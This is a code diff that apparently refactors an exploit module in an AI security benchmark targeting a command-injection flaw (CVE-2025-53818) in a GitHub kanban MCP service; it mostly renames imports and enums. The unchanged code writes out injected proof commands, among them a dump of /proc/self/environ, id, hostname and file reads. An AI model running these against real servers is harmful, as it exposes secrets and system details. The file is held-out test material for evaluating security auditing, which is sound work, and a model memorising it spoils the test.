@@ -25,13 +25,13 @@ directory is the v11 empty tmpfs /work outside the layout, while the checkout st
 import re
 
 from evals.cve.detection.targets import Target
-from evals.cve_environments import command_injection_env
-from evals.cve_grammar import MechanismClass
-from evals.cve_layout import WORK
-from evals.cve_places import Place, Places, PlantKind
-from evals.cve_planting import PlantingHost, SymbolicUser
-from evals.cve_planting_base import PublicNames
-from evals.cve_planting_spec import resolve_container_path
+from evals.cve.environments import command_injection_env
+from evals.cve.grammar import FlawClass
+from evals.cve.layout import WORK
+from evals.cve.places import Place, PlaceKind, Places
+from evals.cve.planting import PlantingHost, SymbolicUser
+from evals.cve.planting_base import PublicNames
+from evals.cve.planting_spec import resolve_container_path
 from mcp_auditor.domain.ports import MCPClientPort
 
 SERVICE = "holdout-2025-53818-github-kanban"
@@ -79,18 +79,18 @@ def _payload(cmd: str) -> str:
 
 def _cmd_for(place: Place) -> str:
     kind = place.kind
-    if kind is PlantKind.FILE:
+    if kind is PlaceKind.FILE:
         coords = place.coordinates
         paths = coords.paths if coords.paths is not None else (coords.path,)
         raw = next(p for p in paths if p is not None)
         return f"cat {resolve_container_path(raw, WORKING_DIRECTORY)}"
-    if kind is PlantKind.ENV:
+    if kind is PlaceKind.ENV:
         return "tr '\\000' '\\n' < /proc/self/environ"
-    if kind is PlantKind.ACCOUNT:
+    if kind is PlaceKind.ACCOUNT:
         return "id"
-    if kind is PlantKind.HOSTNAME:
+    if kind is PlaceKind.HOSTNAME:
         return "hostname"
-    if kind is PlantKind.HTTP_ENDPOINT:
+    if kind is PlaceKind.HTTP_ENDPOINT:
         return f"curl -s --max-time 5 http://{place.coordinates.host}{place.coordinates.path}"
     raise ValueError(f"{place.id}: kind {kind} has no command-execution exploit")
 
@@ -119,7 +119,7 @@ async def _benign(places: Places, client: MCPClientPort) -> None:
 TARGET = Target(
     flaw_id="CVE-2025-53818",
     severity="CVSS 8.8 (v3.1, placeholder)",
-    mechanisms=frozenset({MechanismClass.COMMAND_EXECUTION}),
+    classes=frozenset({FlawClass.COMMAND_EXECUTION}),
     aim=AIM,
     reaches=frozenset({"command_execution"}),
     kept_places=KEPT_PLACES,
